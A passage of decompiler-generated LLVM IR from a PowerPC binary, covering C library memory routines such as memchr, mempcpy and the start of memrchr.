  %v3_100083d4 = load i32, i32* %v2_100083d4, align 4
  %v1_100083d8 = add i32 %v0_100083d4, -8
  %v2_100083d8 = inttoptr i32 %v1_100083d8 to i32*
  %v3_100083d8 = load i32, i32* %v2_100083d8, align 4
  store i32 %v3_100083d8, i32* %r9.global-to-local, align 4
  store i32 %v1_100083d8, i32* %r4.global-to-local, align 4
  %v2_100083dc = add i32 %v1_100083dc, -4
  %v3_100083dc = inttoptr i32 %v2_100083dc to i32*
  store i32 %v3_100083d4, i32* %v3_100083dc, align 4
  %v0_100083e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100083e0 = load i32, i32* %r10.global-to-local, align 4
  %v2_100083e0 = add i32 %v1_100083e0, -8
  %v3_100083e0 = inttoptr i32 %v2_100083e0 to i32*
  store i32 %v0_100083e0, i32* %v3_100083e0, align 4
  store i32 %v2_100083e0, i32* %r10.global-to-local, align 4
  %v0_100083e4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100083e4 = add i32 %v0_100083e4, -1
  store i32 %v1_100083e4, i32* %ctr.global-to-local, align 4
  %v2_100083e4 = icmp eq i32 %v1_100083e4, 0
  br i1 %v2_100083e4, label %dec_label_pc_100083e8, label %dec_label_pc_100083d4

dec_label_pc_100083e8:                            ; preds = %dec_label_pc_100083d4, %dec_label_pc_10008434, %dec_label_pc_100083b8
  %v0_100083e8 = load i32, i32* @r11, align 4
  %v1_100083e8 = urem i32 %v0_100083e8, 8
  store i32 %v1_100083e8, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_100083e8, 4
  br i1 %tmp, label %dec_label_pc_10008400, label %dec_label_pc_100083f4

dec_label_pc_100083f4:                            ; preds = %dec_label_pc_100083e8
  %v0_100083f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100083f4 = add i32 %v0_100083f4, -4
  %v2_100083f4 = inttoptr i32 %v1_100083f4 to i32*
  %v3_100083f4 = load i32, i32* %v2_100083f4, align 4
  store i32 %v1_100083f4, i32* %r4.global-to-local, align 4
  %v1_100083f8 = add nsw i32 %v1_100083e8, -4
  store i32 %v1_100083f8, i32* %r5.global-to-local, align 4
  %v1_100083fc = load i32, i32* %r10.global-to-local, align 4
  %v2_100083fc = add i32 %v1_100083fc, -4
  %v3_100083fc = inttoptr i32 %v2_100083fc to i32*
  store i32 %v3_100083f4, i32* %v3_100083fc, align 4
  store i32 %v2_100083fc, i32* %r10.global-to-local, align 4
  %v0_10008400.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10008400

dec_label_pc_10008400:                            ; preds = %dec_label_pc_100083e8, %dec_label_pc_100083f4
  %v0_10008408 = phi i32 [ %v1_100083e8, %dec_label_pc_100083e8 ], [ %v0_10008400.pre, %dec_label_pc_100083f4 ]
  %v3_10008400 = icmp eq i32 %v0_10008408, 0
  br i1 %v3_10008400, label %dec_label_pc_10008440, label %dec_label_pc_10008408

dec_label_pc_10008408:                            ; preds = %dec_label_pc_10008400
  store i32 %v0_10008408, i32* %ctr.global-to-local, align 4
  %v2_10008410.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000840c

dec_label_pc_1000840c:                            ; preds = %dec_label_pc_1000840c, %dec_label_pc_10008408
  %v2_10008410 = phi i32 [ %v3_10008410, %dec_label_pc_1000840c ], [ %v2_10008410.pre, %dec_label_pc_10008408 ]
  %v0_1000840c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000840c = add i32 %v0_1000840c, -1
  %v2_1000840c = inttoptr i32 %v1_1000840c to i8*
  %v3_1000840c = load i8, i8* %v2_1000840c, align 1
  store i32 %v1_1000840c, i32* %r4.global-to-local, align 4
  %v3_10008410 = add i32 %v2_10008410, -1
  %v4_10008410 = inttoptr i32 %v3_10008410 to i8*
  store i8 %v3_1000840c, i8* %v4_10008410, align 1
  store i32 %v3_10008410, i32* %r10.global-to-local, align 4
  %v0_10008414 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008414 = add i32 %v0_10008414, -1
  store i32 %v1_10008414, i32* %ctr.global-to-local, align 4
  %v2_10008414 = icmp eq i32 %v1_10008414, 0
  br i1 %v2_10008414, label %dec_label_pc_10008440, label %dec_label_pc_1000840c

dec_label_pc_1000841c:                            ; preds = %dec_label_pc_100083c8
  %v1_1000841c = sub nsw i32 4, %v1_100083c8
  store i32 %v1_1000841c, i32* %ctr.global-to-local, align 4
  %v1_10008424 = load i32, i32* @r5, align 4
  %v2_10008424 = sub i32 %v1_10008424, %v1_1000841c
  store i32 %v2_10008424, i32* @r11, align 4
  br label %dec_label_pc_10008428

dec_label_pc_10008428:                            ; preds = %dec_label_pc_10008428, %dec_label_pc_1000841c
  %v2_1000842c = phi i32 [ %v3_1000842c, %dec_label_pc_10008428 ], [ %v0_100083c8, %dec_label_pc_1000841c ]
  %v0_10008428 = load i32, i32* %r4.global-to-local, align 4
  %v1_10008428 = add i32 %v0_10008428, -1
  %v2_10008428 = inttoptr i32 %v1_10008428 to i8*
  %v3_10008428 = load i8, i8* %v2_10008428, align 1
  store i32 %v1_10008428, i32* %r4.global-to-local, align 4
  %v3_1000842c = add i32 %v2_1000842c, -1
  %v4_1000842c = inttoptr i32 %v3_1000842c to i8*
  store i8 %v3_10008428, i8* %v4_1000842c, align 1
  store i32 %v3_1000842c, i32* %r10.global-to-local, align 4
  %v0_10008430 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008430 = add i32 %v0_10008430, -1
  store i32 %v1_10008430, i32* %ctr.global-to-local, align 4
  %v2_10008430 = icmp eq i32 %v1_10008430, 0
  br i1 %v2_10008430, label %dec_label_pc_10008434, label %dec_label_pc_10008428

dec_label_pc_10008434:                            ; preds = %dec_label_pc_10008428
  %v0_10008434 = load i32, i32* @r11, align 4
  %v1_10008434 = call i32 @__asm_rlwinm.(i32 %v0_10008434, i32 29, i32 3, i32 31)
  store i32 %v1_10008434, i32* %r9.global-to-local, align 4
  %v4_10008434 = icmp eq i32 %v1_10008434, 0
  br i1 %v4_10008434, label %dec_label_pc_100083e8, label %dec_label_pc_10008434.dec_label_pc_100083d0_crit_edge

dec_label_pc_10008434.dec_label_pc_100083d0_crit_edge: ; preds = %dec_label_pc_10008434
  %v1_100083dc.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100083d0

dec_label_pc_10008440:                            ; preds = %dec_label_pc_1000840c, %dec_label_pc_10008400
  %v0_10008440 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_10008440

; uselistorder directives
  uselistorder i32 %v1_10008434, { 1, 2, 0 }
  uselistorder i32 %v1_10008430, { 1, 0 }
  uselistorder i32 %v3_1000842c, { 1, 2, 0 }
  uselistorder i32 %v1_10008414, { 1, 0 }
  uselistorder i32 %v3_10008410, { 1, 2, 0 }
  uselistorder i32 %v1_100083e8, { 3, 2, 1, 0 }
  uselistorder i32 %v1_100083e4, { 1, 0 }
  uselistorder i32 %v2_100083e0, { 1, 2, 0 }
  uselistorder i32 %v1_100083c8, { 1, 0 }
  uselistorder i32 %v0_100083c8, { 2, 1, 0 }
  uselistorder i32 %v1_100083b8, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 5, 2, 7, 3, 6, 8 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 5, 3, 6, 4, 7, 8, 9 }
  uselistorder i32 -8, { 2, 3, 1, 4, 0, 5, 6, 7 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_10008400, { 1, 0 }
  uselistorder label %dec_label_pc_100083e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100083b8, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000844c = urem i32 %arg1, 256
  store i32 %v1_1000844c, i32* %r4.global-to-local, align 4
  %v0_1000846c7 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000847013 = icmp eq i32 %arg2, 0
  br i1 %v2_1000847013, label %dec_label_pc_10008478, label %dec_label_pc_10008474

dec_label_pc_10008458:                            ; preds = %dec_label_pc_10008474
  %v1_10008458 = inttoptr i32 %v0_10008458 to i8*
  %v2_10008458 = load i8, i8* %v1_10008458, align 1
  %v3_10008458 = zext i8 %v2_10008458 to i32
  %v0_1000845c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000845c = add i32 %v0_1000845c, -1
  store i32 %v1_1000845c, i32* %r5.global-to-local, align 4
  %v1_10008460 = load i32, i32* %r4.global-to-local, align 4
  %v4_10008460 = icmp eq i32 %v3_10008458, %v1_10008460
  %v0_10008464 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10008460, i32 %v0_10008464)
  %v0_10008468 = load i32, i32* @r3, align 4
  %v1_10008468 = add i32 %v0_10008468, 1
  store i32 %v1_10008468, i32* @r3, align 4
  %v0_10008470 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008470 = add i32 %v0_10008470, -1
  store i32 %v1_10008470, i32* %ctr.global-to-local, align 4
  %v2_10008470 = icmp eq i32 %v1_10008470, 0
  br i1 %v2_10008470, label %dec_label_pc_10008478.loopexit, label %dec_label_pc_10008474

dec_label_pc_10008474:                            ; preds = %entry, %dec_label_pc_10008458
  %v0_10008458 = phi i32 [ %v1_10008468, %dec_label_pc_10008458 ], [ %v0_1000846c7, %entry ]
  %v0_10008474.in.in = phi i32 [ %v1_10008468, %dec_label_pc_10008458 ], [ %v0_1000846c7, %entry ]
  %v0_10008474.in = urem i32 %v0_10008474.in.in, 4
  %v0_10008474 = icmp eq i32 %v0_10008474.in, 0
  br i1 %v0_10008474, label %dec_label_pc_10008478.loopexit, label %dec_label_pc_10008458

dec_label_pc_10008478.loopexit:                   ; preds = %dec_label_pc_10008474, %dec_label_pc_10008458
  %v0_100084a016.ph = phi i32 [ %v1_10008468, %dec_label_pc_10008458 ], [ %v0_10008458, %dec_label_pc_10008474 ]
  %v0_10008478.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000847c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10008478

dec_label_pc_10008478:                            ; preds = %dec_label_pc_10008478.loopexit, %entry
  %v0_1000847c = phi i32 [ %v1_1000844c, %entry ], [ %v0_1000847c.pre, %dec_label_pc_10008478.loopexit ]
  %v0_10008478 = phi i32 [ 0, %entry ], [ %v0_10008478.pre, %dec_label_pc_10008478.loopexit ]
  %v0_100084a016 = phi i32 [ %v0_1000846c7, %entry ], [ %v0_100084a016.ph, %dec_label_pc_10008478.loopexit ]
  %v1_10008478 = udiv i32 %v0_10008478, 4
  %v1_1000847c = mul i32 %v0_1000847c, 256
  %v2_10008484 = or i32 %v1_1000847c, %v0_1000847c
  %v1_1000848c = mul i32 %v2_10008484, 65536
  %v2_10008494 = or i32 %v1_1000848c, %v2_10008484
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_10008478, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10008478, 4
  br i1 %tmp, label %dec_label_pc_10008528, label %dec_label_pc_100084a0

dec_label_pc_100084a0:                            ; preds = %dec_label_pc_10008478, %dec_label_pc_10008524.backedge
  %v0_10008524 = phi i32 [ %v1_10008524, %dec_label_pc_10008524.backedge ], [ %v1_10008478, %dec_label_pc_10008478 ]
  %v0_100084a8 = phi i32 [ %v1_100084a8, %dec_label_pc_10008524.backedge ], [ %v0_10008478, %dec_label_pc_10008478 ]
  %v0_100084e0 = phi i32 [ %v1_100084a4, %dec_label_pc_10008524.backedge ], [ %v0_100084a016, %dec_label_pc_10008478 ]
  %v1_100084a0 = inttoptr i32 %v0_100084e0 to i32*
  %v2_100084a0 = load i32, i32* %v1_100084a0, align 4
  %v1_100084a4 = add i32 %v0_100084e0, 4
  store i32 %v1_100084a4, i32* @r3, align 4
  %v1_100084a8 = add i32 %v0_100084a8, -4
  store i32 %v1_100084a8, i32* %r5.global-to-local, align 4
  %v2_100084ac = xor i32 %v2_100084a0, %v2_10008494
  %v1_100084b4 = add i32 %v2_100084ac, 2130640639
  %v2_100084b8 = xor i32 %v1_100084b4, %v2_100084ac
  %v2_100084c0 = and i32 %v2_100084b8, -2130640640
  %v6_100084c0 = icmp eq i32 %v2_100084c0, -2130640640
  br i1 %v6_100084c0, label %dec_label_pc_10008524.backedge, label %dec_label_pc_100084c8

dec_label_pc_10008524.backedge:                   ; preds = %dec_label_pc_100084a0, %dec_label_pc_10008510
  %v1_10008524 = add i32 %v0_10008524, -1
  store i32 %v1_10008524, i32* %ctr.global-to-local, align 4
  %v2_10008524 = icmp eq i32 %v1_10008524, 0
  br i1 %v2_10008524, label %dec_label_pc_10008528, label %dec_label_pc_100084a0

dec_label_pc_100084c8:                            ; preds = %dec_label_pc_100084a0
  %v2_100084c8 = inttoptr i32 %v0_100084e0 to i8*
  %v3_100084c8 = load i8, i8* %v2_100084c8, align 1
  %v4_100084c8 = zext i8 %v3_100084c8 to i32
  %v1_100084cc = add i32 %v0_100084e0, 3
  %v1_100084d0 = add i32 %v0_100084e0, 1
  %v1_100084d4 = add i32 %v0_100084e0, 2
  %v4_100084d8 = icmp eq i32 %v4_100084c8, %v0_1000847c
  br i1 %v4_100084d8, label %dec_label_pc_100084e0, label %dec_label_pc_100084e8

dec_label_pc_100084e0:                            ; preds = %dec_label_pc_100084c8
  ret i32 %v0_100084e0

dec_label_pc_100084e8:                            ; preds = %dec_label_pc_100084c8
  %v2_100084e8 = inttoptr i32 %v1_100084d0 to i8*
  %v3_100084e8 = load i8, i8* %v2_100084e8, align 1
  %v4_100084e8 = zext i8 %v3_100084e8 to i32
  %v4_100084ec = icmp eq i32 %v4_100084e8, %v0_1000847c
  br i1 %v4_100084ec, label %dec_label_pc_100084f4, label %dec_label_pc_100084fc

dec_label_pc_100084f4:                            ; preds = %dec_label_pc_100084e8
  ret i32 %v1_100084d0

dec_label_pc_100084fc:                            ; preds = %dec_label_pc_100084e8
  %v2_100084fc = inttoptr i32 %v1_100084d4 to i8*
  %v3_100084fc = load i8, i8* %v2_100084fc, align 1
  %v4_100084fc = zext i8 %v3_100084fc to i32
  %v4_10008500 = icmp eq i32 %v4_100084fc, %v0_1000847c
  br i1 %v4_10008500, label %dec_label_pc_10008508, label %dec_label_pc_10008510

dec_label_pc_10008508:                            ; preds = %dec_label_pc_100084fc
  ret i32 %v1_100084d4

dec_label_pc_10008510:                            ; preds = %dec_label_pc_100084fc
  %v2_10008510 = inttoptr i32 %v1_100084cc to i8*
  %v3_10008510 = load i8, i8* %v2_10008510, align 1
  %v4_10008510 = zext i8 %v3_10008510 to i32
  %v4_10008514 = icmp eq i32 %v4_10008510, %v0_1000847c
  br i1 %v4_10008514, label %dec_label_pc_1000851c, label %dec_label_pc_10008524.backedge

dec_label_pc_1000851c:                            ; preds = %dec_label_pc_10008510
  ret i32 %v1_100084cc

dec_label_pc_10008528:                            ; preds = %dec_label_pc_10008524.backedge, %dec_label_pc_10008478
  %v0_1000853426 = phi i32 [ %v0_100084a016, %dec_label_pc_10008478 ], [ %v1_100084a4, %dec_label_pc_10008524.backedge ]
  %v0_10008528 = phi i32 [ %v0_10008478, %dec_label_pc_10008478 ], [ %v1_100084a8, %dec_label_pc_10008524.backedge ]
  %v1_10008528 = add i32 %v0_10008528, 1
  store i32 %v1_10008528, i32* %r5.global-to-local, align 4
  store i32 %v0_10008528, i32* %ctr.global-to-local, align 4
  %v2_100085443 = icmp eq i32 %v0_10008528, 0
  br i1 %v2_100085443, label %dec_label_pc_10008548, label %dec_label_pc_10008534

dec_label_pc_10008534:                            ; preds = %dec_label_pc_10008528, %dec_label_pc_10008534.dec_label_pc_10008534_crit_edge
  %v1_10008538 = phi i32 [ %v1_10008538.pre, %dec_label_pc_10008534.dec_label_pc_10008534_crit_edge ], [ %v0_1000847c, %dec_label_pc_10008528 ]
  %v0_10008534 = phi i32 [ %v1_10008540, %dec_label_pc_10008534.dec_label_pc_10008534_crit_edge ], [ %v0_1000853426, %dec_label_pc_10008528 ]
  %v1_10008534 = inttoptr i32 %v0_10008534 to i8*
  %v2_10008534 = load i8, i8* %v1_10008534, align 1
  %v3_10008534 = zext i8 %v2_10008534 to i32
  %v4_10008538 = icmp eq i32 %v3_10008534, %v1_10008538
  %v0_1000853c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10008538, i32 %v0_1000853c)
  %v0_10008540 = load i32, i32* @r3, align 4
  %v1_10008540 = add i32 %v0_10008540, 1
  store i32 %v1_10008540, i32* @r3, align 4
  %v0_10008544 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008544 = add i32 %v0_10008544, -1
  store i32 %v1_10008544, i32* %ctr.global-to-local, align 4
  %v2_10008544 = icmp eq i32 %v1_10008544, 0
  br i1 %v2_10008544, label %dec_label_pc_10008548, label %dec_label_pc_10008534.dec_label_pc_10008534_crit_edge

dec_label_pc_10008534.dec_label_pc_10008534_crit_edge: ; preds = %dec_label_pc_10008534
  %v1_10008538.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10008534

dec_label_pc_10008548:                            ; preds = %dec_label_pc_10008534, %dec_label_pc_10008528
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10008544, { 1, 0 }
  uselistorder i32 %v1_10008540, { 1, 0 }
  uselistorder i32 %v0_10008528, { 1, 2, 0 }
  uselistorder i32 %v1_10008524, { 2, 1, 0 }
  uselistorder i32 %v1_100084a8, { 0, 2, 1 }
  uselistorder i32 %v1_100084a4, { 0, 2, 1 }
  uselistorder i32 %v0_100084e0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v2_10008484, { 1, 0 }
  uselistorder i32 %v1_10008478, { 1, 0 }
  uselistorder i32 %v0_100084a016, { 1, 0 }
  uselistorder i32 %v0_10008478, { 3, 2, 0, 1 }
  uselistorder i32 %v0_1000847c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v1_10008470, { 1, 0 }
  uselistorder i32 %v1_10008468, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000846c7, { 2, 0, 1 }
  uselistorder i32 %v1_1000844c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 5, 1, 7, 6, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008534, { 1, 0 }
  uselistorder label %dec_label_pc_10008524.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100084a0, { 1, 0 }
  uselistorder label %dec_label_pc_10008474, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268469612, i32* @lr, align 4
  %v0_10008568 = call i32 @memcpy()
  %v0_10008570 = load i32, i32* @r28, align 4
  %v1_10008570 = load i32, i32* @r29, align 4
  %v2_10008570 = add i32 %v1_10008570, %v0_10008570
  ret i32 %v2_10008570
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10008588 = urem i32 %arg2, 256
  store i32 %v1_10008588, i32* %r4.global-to-local, align 4
  %v2_10008590 = add i32 %arg3, %arg1
  store i32 %v2_10008590, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_100085ac13 = icmp eq i32 %arg3, 0
  br i1 %v2_100085ac13, label %dec_label_pc_100085b4, label %dec_label_pc_100085b0

dec_label_pc_10008598:                            ; preds = %dec_label_pc_100085b0
  %v1_10008598 = add i32 %v0_10008598, -1
  %v2_10008598 = inttoptr i32 %v1_10008598 to i8*
  %v3_10008598 = load i8, i8* %v2_10008598, align 1
  %v4_10008598 = zext i8 %v3_10008598 to i32
  store i32 %v1_10008598, i32* %r3.global-to-local, align 4
  %v0_1000859c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000859c = add i32 %v0_1000859c, -1
  store i32 %v1_1000859c, i32* %r5.global-to-local, align 4
  %v1_100085a0 = load i32, i32* %r4.global-to-local, align 4
  %v4_100085a0 = icmp eq i32 %v4_10008598, %v1_100085a0
  %v0_100085a4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100085a0, i32 %v0_100085a4)
  %v0_100085a8 = load i32, i32* %r3.global-to-local, align 4
  %v0_100085ac = load i32, i32* %ctr.global-to-local, align 4
  %v1_100085ac = add i32 %v0_100085ac, -1
  store i32 %v1_100085ac, i32* %ctr.global-to-local, align 4
  %v2_100085ac = icmp eq i32 %v1_100085ac, 0
  br i1 %v2_100085ac, label %dec_label_pc_100085b4.loopexit, label %dec_label_pc_100085b0

dec_label_pc_100085b0:                            ; preds = %entry, %dec_label_pc_10008598
  %v0_10008598 = phi i32 [ %v0_100085a8, %dec_label_pc_10008598 ], [ %v2_10008590, %entry ]
  %v0_100085b0.in.in = phi i32 [ %v0_100085a8, %dec_label_pc_10008598 ], [ %v2_10008590, %entry ]
  %v0_100085b0.in = urem i32 %v0_100085b0.in.in, 4
  %v0_100085b0 = icmp eq i32 %v0_100085b0.in, 0
  br i1 %v0_100085b0, label %dec_label_pc_100085b4.loopexit, label %dec_label_pc_10008598

dec_label_pc_100085b4.loopexit:                   ; preds = %dec_label_pc_100085b0, %dec_label_pc_10008598
  %v0_100085dc16.ph = phi i32 [ %v0_100085a8, %dec_label_pc_10008598 ], [ %v0_10008598, %dec_label_pc_100085b0 ]
  %v0_100085b4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_100085b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100085b4

dec_label_pc_100085b4:                            ; preds = %dec_label_pc_100085b4.loopexit, %entry
  %v0_100085b8 = phi i32 [ %v1_10008588, %entry ], [ %v0_100085b8.pre, %dec_label_pc_100085b4.loopexit ]
  %v0_100085b4 = phi i32 [ 0, %entry ], [ %v0_100085b4.pre, %dec_label_pc_100085b4.loopexit ]
  %v0_100085dc16 = phi i32 [ %v2_10008590, %entry ], [ %v0_100085dc16.ph, %dec_label_pc_100085b4.loopexit ]
  %v1_100085b4 = udiv i32 %v0_100085b4, 4
  %v1_100085b8 = mul i32 %v0_100085b8, 256
  %v2_100085c0 = or i32 %v1_100085b8, %v0_100085b8
  %v1_100085c8 = mul i32 %v2_100085c0, 65536
  %v2_100085d0 = or i32 %v1_100085c8, %v2_100085c0
  store i32 %v2_100085d0, i32* @r7, align 4
  store i32 -2130640640, i32* %r8.global-to-local, align 4
  store i32 %v1_100085b4, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_100085b4, 4
  br i1 %tmp, label %dec_label_pc_10008654, label %dec_label_pc_100085dc

dec_label_pc_100085dc:                            ; preds = %dec_label_pc_100085b4, %dec_label_pc_10008650.backedge.dec_label_pc_100085dc_crit_edge
  %v0_1000865021 = phi i32 [ %v1_10008650, %dec_label_pc_10008650.backedge.dec_label_pc_100085dc_crit_edge ], [ %v1_100085b4, %dec_label_pc_100085b4 ]
  %v0_100085f8 = phi i32 [ %v0_100085f8.pre, %dec_label_pc_10008650.backedge.dec_label_pc_100085dc_crit_edge ], [ -2130640640, %dec_label_pc_100085b4 ]
  %v0_100085e4 = phi i32 [ %v0_100085e4.pre, %dec_label_pc_10008650.backedge.dec_label_pc_100085dc_crit_edge ], [ %v2_100085d0, %dec_label_pc_100085b4 ]
  %v0_100085e0 = phi i32 [ %v0_100085e0.pre, %dec_label_pc_10008650.backedge.dec_label_pc_100085dc_crit_edge ], [ %v0_100085b4, %dec_label_pc_100085b4 ]
  %v0_100085dc = phi i32 [ %v0_100085dc.pre, %dec_label_pc_10008650.backedge.dec_label_pc_100085dc_crit_edge ], [ %v0_100085dc16, %dec_label_pc_100085b4 ]
  %v1_100085dc = add i32 %v0_100085dc, -4
  %v2_100085dc = inttoptr i32 %v1_100085dc to i32*
  %v3_100085dc = load i32, i32* %v2_100085dc, align 4
  store i32 %v1_100085dc, i32* %r3.global-to-local, align 4
  %v1_100085e0 = add i32 %v0_100085e0, -4
  store i32 %v1_100085e0, i32* %r5.global-to-local, align 4
  %v2_100085e4 = xor i32 %v3_100085dc, %v0_100085e4
  %v1_100085ec = add i32 %v2_100085e4, 2130640639
  %v2_100085f0 = xor i32 %v1_100085ec, %v2_100085e4
  %v1_100085f4 = add i32 %v0_100085dc, -1
  %v2_100085f8 = sub i32 -1, %v2_100085f0
  %v3_100085f8 = and i32 %v0_100085f8, %v2_100085f8
  %v6_100085f8 = icmp eq i32 %v3_100085f8, 0
  br i1 %v6_100085f8, label %dec_label_pc_10008650.backedge, label %dec_label_pc_10008600

dec_label_pc_10008600:                            ; preds = %dec_label_pc_100085dc
  %v2_10008600 = inttoptr i32 %v1_100085f4 to i8*
  %v3_10008600 = load i8, i8* %v2_10008600, align 1
  %v4_10008600 = zext i8 %v3_10008600 to i32
  %v1_10008604 = add i32 %v0_100085dc, -2
  %v1_10008608 = add i32 %v0_100085dc, -3
  %v1_1000860c = load i32, i32* %r4.global-to-local, align 4
  %v4_1000860c = icmp eq i32 %v4_10008600, %v1_1000860c
  br i1 %v4_1000860c, label %dec_label_pc_10008614, label %dec_label_pc_1000861c

dec_label_pc_10008614:                            ; preds = %dec_label_pc_10008600
  store i32 %v1_100085f4, i32* %r3.global-to-local, align 4
  ret i32 %v1_100085f4

dec_label_pc_1000861c:                            ; preds = %dec_label_pc_10008600
  %v2_1000861c = inttoptr i32 %v1_10008604 to i8*
  %v3_1000861c = load i8, i8* %v2_1000861c, align 1
  %v4_1000861c = zext i8 %v3_1000861c to i32
  %v4_10008620 = icmp eq i32 %v4_1000861c, %v1_1000860c
  br i1 %v4_10008620, label %dec_label_pc_10008628, label %dec_label_pc_10008630

dec_label_pc_10008628:                            ; preds = %dec_label_pc_1000861c
  store i32 %v1_10008604, i32* %r3.global-to-local, align 4
  ret i32 %v1_10008604

dec_label_pc_10008630:                            ; preds = %dec_label_pc_1000861c
  %v2_10008630 = inttoptr i32 %v1_10008608 to i8*
  %v3_10008630 = load i8, i8* %v2_10008630, align 1
  %v4_10008630 = zext i8 %v3_10008630 to i32
  %v4_10008634 = icmp eq i32 %v4_10008630, %v1_1000860c
  br i1 %v4_10008634, label %dec_label_pc_1000863c, label %dec_label_pc_10008644

dec_label_pc_1000863c:                            ; preds = %dec_label_pc_10008630
  store i32 %v1_10008608, i32* %r3.global-to-local, align 4
  ret i32 %v1_10008608

dec_label_pc_10008644:                            ; preds = %dec_label_pc_10008630
  %v1_10008644 = inttoptr i32 %v1_100085dc to i8*
  %v2_10008644 = load i8, i8* %v1_10008644, align 1
  %v3_10008644 = zext i8 %v2_10008644 to i32
  %v4_10008648 = icmp eq i32 %v3_10008644, %v1_1000860c
  %v0_1000864c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10008648, i32 %v0_1000864c)
  %v0_10008650.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10008650.backedge

dec_label_pc_10008650.backedge:                   ; preds = %dec_label_pc_10008644, %dec_label_pc_100085dc
  %v0_10008650 = phi i32 [ %v0_10008650.pre, %dec_label_pc_10008644 ], [ %v0_1000865021, %dec_label_pc_100085dc ]
  %v1_10008650 = add i32 %v0_10008650, -1
  store i32 %v1_10008650, i32* %ctr.global-to-local, align 4
  %v2_10008650 = icmp eq i32 %v1_10008650, 0
  br i1 %v2_10008650, label %dec_label_pc_10008650.dec_label_pc_10008654_crit_edge, label %dec_label_pc_10008650.backedge.dec_label_pc_100085dc_crit_edge

dec_label_pc_10008650.backedge.dec_label_pc_100085dc_crit_edge: ; preds = %dec_label_pc_10008650.backedge
  %v0_100085dc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_100085e0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_100085e4.pre = load i32, i32* @r7, align 4
  %v0_100085f8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100085dc

dec_label_pc_10008650.dec_label_pc_10008654_crit_edge: ; preds = %dec_label_pc_10008650.backedge
  %v0_10008654.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10008654

dec_label_pc_10008654:                            ; preds = %dec_label_pc_10008650.dec_label_pc_10008654_crit_edge, %dec_label_pc_100085b4
  %v0_10008654 = phi i32 [ %v0_10008654.pre, %dec_label_pc_10008650.dec_label_pc_10008654_crit_edge ], [ %v0_100085b4, %dec_label_pc_100085b4 ]
  %v1_10008654 = add i32 %v0_10008654, 1
  store i32 %v1_10008654, i32* %r5.global-to-local, align 4
  store i32 %v0_10008654, i32* %ctr.global-to-local, align 4
  %v2_1000866c3 = icmp eq i32 %v0_10008654, 0
  br i1 %v2_1000866c3, label %dec_label_pc_10008670, label %dec_label_pc_10008660

